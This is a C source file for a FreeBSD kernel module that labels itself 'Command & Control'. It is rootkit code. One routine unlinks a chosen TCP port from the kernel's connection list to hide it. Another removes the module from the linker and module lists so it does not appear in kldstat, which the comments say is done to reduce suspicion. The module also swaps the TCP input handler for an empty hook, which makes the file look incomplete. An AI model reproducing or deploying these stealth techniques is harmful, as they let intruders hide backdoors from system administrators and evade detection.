/*
 * =================================================================================
 *
 *       Filename:  control_module.c
 *
 *    Description:  FreeBSD Command & Control Kernel Module --
 *
 *        Version:  1.0
 *        Created:  2012-05-30 01:13:16
 *       Revision:  none
 *       Compiler:  clang
 *
 *         Author:  Steffen L. Norgren (http://nein.ca), ironix@nein.ca
 *        Company:  Esurient Systems Inc.
 *
 * =================================================================================
 */
#include "control_module.h"

/* System call to hide an open local network port. */
static void hide_port(int lport)
{
    struct inpcb *inpb;

    INP_INFO_WLOCK(&tcbinfo);

    /* Iterate through the TCP-based inpcb list */
    LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
        if (inpb->inp_vflag & INP_TIMEWAIT)
            continue;

		/* lock writing to the kernel struct */
        INP_WLOCK(inpb);

        /* Check to see if this is the port we want hidden */
        if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
            LIST_REMOVE(inpb, inp_list);

		/* unlock writing to the kernel struct */
        INP_WUNLOCK(inpb);
    }

    INP_INFO_WUNLOCK(&tcbinfo);
}

static void tcp_input_hook(struct mbuf *m, int off0) {
}

static void hide_module(void)
{
    struct linker_file *lf;
    struct module *mod;

    /* Giant lock is used in the kernel to provice concurrency control */
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    /*
     * Decrement the current kernel image's reference count. This reduces suspicion
     * when executing 'kldstat', for if another kernel module is loaded, there will
     * be a gap in the list of ids.
     */
    (&linker_files)->tqh_first->refs--;

    /*
     * Iterate throught he linker_files list, looking for MODULE_FILE. If found,
     * decrement the next_file_id and remove from the list.
     */
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, MODULE_FILE) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    /* 
     * Shared/exclusive locks are used to protect data that are read far more
     * often than they are written.
     */
    sx_xlock(&modules_sx);

    /*
     * Iterate through the module list, looking for MODULE_NAME. If found,
     * decrement nextid and remove from the list.
     */
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, MODULE_NAME) == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }

    sx_xunlock(&modules_sx);
}

static int module_events(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd) {
        case MOD_LOAD:
#if DEBUG
            uprintf("Module %s loaded.\n", MODULE_FILE);
#endif

            if (MODULE_HIDE) {
#if DEBUG
                uprintf("Hiding %s module.\n", MODULE_FILE);
#endif
                hide_module();
            }
			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input_hook;
            break;

        case MOD_UNLOAD:
#if DEBUG
            uprintf("Module %s unloaded.\n", MODULE_FILE);
#endif
			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input;
            break;

        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t control_module_mod = {
    MODULE_NAME,    /* module name */
    module_events,  /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(control_module, control_module_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
